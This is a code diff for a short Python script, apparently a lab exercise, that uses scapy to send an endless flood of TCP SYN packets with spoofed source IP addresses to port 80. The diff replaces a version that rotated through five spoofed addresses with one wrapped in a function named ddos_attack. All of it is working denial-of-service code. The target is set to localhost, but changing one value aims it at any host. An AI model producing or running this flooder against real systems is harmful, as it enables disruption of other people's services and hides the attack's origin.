@@ -1,23 +1,18 @@
 from scapy.all import IP, TCP, send
-import random
+
+spoofed_ip = "192.0.2.1"
+target_ip = "127.0.0.1"
+target_port = 80
+
+def ddos_attack():
+    while True:
+        ip = IP(src=spoofed_ip, dst=target_ip)
+        tcp = TCP(sport=12345, dport=target_port, flags="S")
+        packet = ip / tcp
+        send(packet, verbose=0)
+        print(f"Packet sent from spoofed IP: {spoofed_ip} to {target_ip}:{target_port}")
+
+ddos_attack()
 
 
-spoofed_ips = [
-    "192.0.2.1",
-    "192.0.2.2",
-    "192.0.2.3",
-    "192.0.2.4",
-    "192.0.2.5"
-]
 
-i = 1
-
-while True:
-    src_ip = random.choice(spoofed_ips)  
-    ip = IP(src=src_ip, dst="127.0.0.1")  
-    tcp = TCP(sport=12345, dport=80, flags="S")  
-    packet = ip / tcp
-    send(packet, verbose=0)
-    
-    print(f"Packet sent: {i} | Spoofed Source IP: {src_ip}")
-    i += 1
